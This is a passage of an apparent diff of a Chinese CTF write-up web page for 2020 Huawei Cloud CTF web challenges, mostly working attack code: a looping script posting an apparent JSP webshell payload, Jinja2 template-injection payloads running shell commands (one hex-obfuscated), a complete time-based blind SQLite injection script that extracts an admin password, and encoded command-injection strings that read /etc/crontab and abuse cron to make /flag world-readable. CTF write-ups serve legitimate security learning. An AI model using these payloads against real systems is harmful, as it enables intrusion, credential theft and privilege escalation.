+    out.print(&quot;&lt;/pre&gt;&quot;);
+}
+%&gt;&quot;&quot;&quot;
+    uploadurl = url + &quot;upload.jsp&quot;
+    exp = generate_random_str()+payload+generate_random_str()
+    res = req.post(uploadurl,data=str(base64.b64encode(exp.encode('utf-8')),'utf-8'))
+    print(str(base64.b64encode(exp.encode('utf-8')),'utf-8'))
+    print(res.text.replace(&quot;\n&quot;,&quot;&quot;))
+    return res.text.replace(&quot;\n&quot;,&quot;&quot;)
+def cat():
+    res = req.get(url+upload())
+    print(res.text.replace(&quot;\n&quot;, &quot;&quot;))
+if __name__ == '__main__':
+    while True:
+        cat()
+</code></pre> <p><img alt src=../../image/CTF_Writeup/2020HuaweiCTF/1.jpg> <img alt src=../../image/CTF_Writeup/2020HuaweiCTF/2.png></p> <h2 id=mine1_1>mine1_1<a class=headerlink href=#mine1_1 title="Permanent link">&para;</a></h2> <p>SSTI</p> <p>绕就行</p> <pre><code>/success?msg={{(lipsum|attr(request.values.a)).get(request.values.b).get(request.values.c)(request.values.d).popen(request.values.e).read()}}&amp;a=__globals__&amp;b=__builtins__&amp;c=__import__&amp;d=os&amp;e=cat%20flag.txt&amp;f=123
+</code></pre> <p><img alt src=../../image/CTF_Writeup/2020HuaweiCTF/3.png></p> <h2 id=mine2>mine2<a class=headerlink href=#mine2 title="Permanent link">&para;</a></h2> <p>再绕，构造</p> <pre><code>/success?msg={%print(&quot;&quot;|attr(&quot;\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f&quot;)|attr(&quot;\x5f\x5f\x62\x61\x73\x65\x73\x5f\x5f&quot;)|attr(&quot;\x5f\x5f\x67\x65\x74\x69\x74\x65\x6d\x5f\x5f&quot;)(0)|attr(&quot;\x5f\x5f\x73\x75\x62\x63\x6c\x61\x73\x73\x65\x73\x5f\x5f&quot;)()|attr(&quot;\x5f\x5f\x67\x65\x74\x69\x74\x65\x6d\x5f\x5f&quot;)(202)|attr(&quot;\x5f\x5f\x69\x6e\x69\x74\x5f\x5f&quot;)|attr(&quot;\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f&quot;)|attr(&quot;\x5f\x5f\x67\x65\x74\x69\x74\x65\x6d\x5f\x5f&quot;)(&quot;\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f&quot;)|attr(&quot;\x5f\x5f\x67\x65\x74\x69\x74\x65\x6d\x5f\x5f&quot;)(&quot;eval&quot;)(&quot;\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x6f\x73\x27\x29\x2e\x70\x6f\x70\x65\x6e\x28\x27\x6c\x73\x20\x2d\x61\x6c\x6c\x27\x29\x2e\x72\x65\x61\x64\x28\x29&quot;))%}
+</code></pre> <p><img alt src=../../image/CTF_Writeup/2020HuaweiCTF/4.png></p> <h2 id=pyer>pyer<a class=headerlink href=#pyer title="Permanent link">&para;</a></h2> <p>SQLite注入</p> <pre><code class=python>import requests
+import string
+import time
+url = &quot;http://124.70.221.177:31229/login&quot;
+req = requests.Session()
+str1 = string.ascii_letters+string.digits+string.printable+'!&quot;#$%&amp;\'()*+,-./:;&lt;=&gt;?@[\\]^_`{|}~'
+str2 = string.printable
+def version():
+    text = &quot;&quot;
+    for i in range(1,40):
+        for j in str2:
+            startTime = time.time()
+            req.post(url,data={
+                &quot;username&quot;:&quot;admin' || 1=(case when(substr(sqlite_version(),{},1)='{}') then randomblob(50000000) else 0 end) || '1&quot;.format(i,j),
+                &quot;password&quot;:&quot;admin&quot;
+            })
+
+            if time.time() - startTime &gt; 5:
+                text += j
+                print(text)
+                break
+#  comment,users
+def table():
+    text = &quot;&quot;
+    for i in range(1,40):
+        for j in str2:
+            startTime = time.time()
+            payload = &quot;admin' || 1=(case when(substr((SELECT group_concat(tbl_name) FROM sqlite_master WHERE type = 'table'),{},1)='{}') then randomblob(50000000) else 0 end) || '1&quot;.format(i,j)
+            req.post(url,data={
+                &quot;username&quot;:payload,
+                &quot;password&quot;:&quot;admin&quot;
+            })
+            print(payload)
+            if time.time() - startTime &gt; 4:
+                text += j
+                print(text)
+                break
+# CREATE TABLE `comment` (
+#   `Id` int(11) NOT NULL,
+#   `username` varchar(255) DEFAULT NULL,
+#   `comment` varchar(255) DEFAULT NULL,
+#   PRIMARY KEY (`Id`)
+# )
+# CREATE TABLE `users` (
+#   `Id` int(11) NOT NULL,
+#   `username` varchar(255) DEFAULT NULL,
+#   `password` varchar(255) DEFAULT NULL,
+#   PRIMARY KEY (`Id`)
+# )
+def sql():
+    text = &quot;&quot;
+    for i in range(1,200):
+        for j in str2:
+            startTime = time.time()
+            payload = &quot;admin' || 1=(case when(substr((SELECT group_concat(sql) FROM sqlite_master WHERE type = 'table'),{},1)='{}') then randomblob(50000000) else 0 end) || '1&quot;.format(i,j)
+            req.post(url,data={
+                &quot;username&quot;:payload,
+                &quot;password&quot;:&quot;admin&quot;
+            })
+            #print(payload)
+            if time.time() - startTime &gt; 4:
+                text += j
+                print(text)
+                break
+#sqlite_not_safe
+def password():
+    text = &quot;&quot;
+    for i in range(1,200):
+        for j in str2:
+            startTime = time.time()
+            payload = &quot;admin' || 1=(case when(substr((SELECT group_concat(password) FROM users WHERE username='admin'),{},1)='{}') then randomblob(50000000) else 0 end) || '1&quot;.format(i,j)
+            req.post(url,data={
+                &quot;username&quot;:payload,
+                &quot;password&quot;:&quot;admin&quot;
+            })
+            print(payload)
+            if time.time() - startTime &gt; 4:
+                text += j
+                print(text)
+                break
+if __name__ == '__main__':
+    password()
+
+</code></pre> <p>拿到admin/sqlite_not_safe 登录后发现还有注入+模版注入 <img alt src=../../image/CTF_Writeup/2020HuaweiCTF/5.png></p> <pre><code>username=admin'union+select+'{{lipsum.__globals__.__builtins__.__import__(&quot;os&quot;).popen(&quot;cat flag.txt&quot;).read()}}'--%20&amp;submit=%E7%99%BB%E9%99%86
+</code></pre> <h2 id=hids>hids<a class=headerlink href=#hids title="Permanent link">&para;</a></h2> <p>命令执行 <img alt src=../../image/CTF_Writeup/2020HuaweiCTF/6.png></p> <p>ls -all / <code>ls$IFS$(printf$IFS"\55\141\154\154")$IFS$(printf$IFS"\57")</code></p> <p><img alt src=../../image/CTF_Writeup/2020HuaweiCTF/7.png></p> <p>cat ../../../../etc/crontab <code>cat$IFS$(printf$IFS"\56\56\57\56\56\57\56\56\57\56\56\57\145\164\143\57\143\162\157\156\164\141\142")</code></p> <p><img alt src=../../image/CTF_Writeup/2020HuaweiCTF/8.png> 利用crontab提权</p> <p>echo "import os;os.system('chmod 777 /flag')"&gt;/detect.py</p> <p><code>echo$IFS$(printf$IFS"\151\155\160\157\162\164\40\157\163\73\157\163\56\163\171\163\164\145\155\50\47\143\150\155\157\144\40\67\67\67\40\57\146\154\141\147\47\51")&gt;$(printf$IFS"\57\144\145\164\145\143\164\56\160\171")</code></p> <p>cat /detect.py</p> <p><code>cat$IFS$(printf$IFS"\57\144\145\164\145\143\164\56\160\171")</code> cat /flag</p> <p><code>cat$IFS$(printf$IFS"\57\146\154\141\147")</code></p> <h2 id=cloud>cloud<a class=headerlink href=#cloud title="Permanent link">&para;</a></h2> <hr> <div class=md-source-date> <small> Last update: 2021-04-25 </small> </div> </article> </div> </div> </main> <footer class=md-footer> <div class=md-footer-nav> <nav class="md-footer-nav__inner md-grid" aria-label=Footer> <a href=../2020xyb/ title=2020祥云杯 class="md-footer-nav__link md-footer-nav__link--prev" rel=prev> <div class="md-footer-nav__button md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg> </div> <div class=md-footer-nav__title> <div class=md-ellipsis> <span class=md-footer-nav__direction> Previous </span> 2020祥云杯 </div> </div> </a> <a href=../2020Huawei2/ title=2020华为云CTF第二场 class="md-footer-nav__link md-footer-nav__link--next" rel=next> <div class=md-footer-nav__title> <div class=md-ellipsis> <span class=md-footer-nav__direction> Next </span> 2020华为云CTF第二场 </div> </div> <div class="md-footer-nav__button md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4z"/></svg> </div> </a> </nav> </div> <div class="md-footer-meta md-typeset"> <div class="md-footer-meta__inner md-grid"> <div class=md-footer-copyright> Made with <a href=https://squidfunk.github.io/mkdocs-material/ target=_blank rel=noopener> Material for MkDocs </a> </div> </div> </div> </footer> </div> <script src=../../assets/javascripts/vendor.d710d30a.min.js></script> <script src=../../assets/javascripts/bundle.b39636ac.min.js></script><script id=__lang type=application/json>{"clipboard.copy": "Copy to clipboard", "clipboard.copied": "Copied to clipboard", "search.config.lang": "en", "search.config.pipeline": "trimmer, stopWordFilter", "search.config.separator": "[\\s\\-]+", "search.result.placeholder": "Type to start searching", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents"}</script> <script>
         app = initialize({
           base: "../..",
           features: [],
@@ -1029,14 +129,4 @@ cat /flag</p>
             worker: "../../assets/javascripts/worker/search.a68abb33.min.js"
           }, typeof search !== "undefined" && search)
         })
-      </script>
-      
-        <script src="https://code.jquery.com/jquery-3.2.1.min.js"></script>
-      
-        <script src="../../js/simpleLightbox.min.js"></script>
-      
-        <script src="../../js/extension.js"></script>
-      
-    
-  </body>
-</html>
+      </script> <script src=https://code.jquery.com/jquery-3.2.1.min.js></script> <script src=../../js/simpleLightbox.min.js></script> <script src=../../js/extension.js></script> <script src=../../js/vendor.js></script> <script src=../../js/app.js></script> </body> </html>
